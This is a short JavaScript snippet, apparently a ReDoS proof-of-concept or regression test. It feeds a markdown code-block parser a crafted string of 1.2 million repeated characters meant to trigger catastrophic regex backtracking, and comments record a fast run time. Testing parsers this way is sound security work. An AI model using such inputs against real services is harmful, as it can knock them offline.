const { getCodeblock } = require("./parseMarkdown.js");

//Attack String :"<codeblock  "+"aaaaaaaaaaaa"*100000+"@"
var str = "<codeblock  ";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaaaaaaaa";
}
str += "@";

var result = getCodeblock(str);

// real    0m0.072s
// user    0m0.040s
// sys     0m0.024s
